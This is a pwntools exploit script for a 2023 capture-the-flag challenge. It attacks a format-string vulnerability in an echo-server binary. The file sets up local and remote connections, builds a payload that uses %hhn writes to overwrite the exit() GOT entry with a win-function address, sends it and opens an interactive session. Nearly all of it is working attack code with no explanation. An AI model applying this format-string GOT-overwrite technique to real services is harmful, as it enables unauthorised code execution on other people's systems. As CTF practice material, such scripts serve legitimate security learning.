#!/usr/bin/env python3

#===========================================================
#                      MGCICTF 2023
#===========================================================

from pwn import *

exe = context.binary = ELF('./fmt2.elf')

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 31337)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
io.recvuntil(b'Welcome to the echo server V2! No way you can leak the flag now!\n')

WIN_ADDR = 0x4011D6
GOTPLT_EXIT_ADDR = 0x404040
payload = fit({
    0x0:    '%{}c%38$hhn%{}c%39$hhn'.format(
                    0x11,
                    0xD6 - 0x11
    ).encode(),

    0x100:  p64(GOTPLT_EXIT_ADDR + 1),
    0x108:  p64(GOTPLT_EXIT_ADDR)
})
io.sendline(payload)

resp = io.recv()

io.interactive()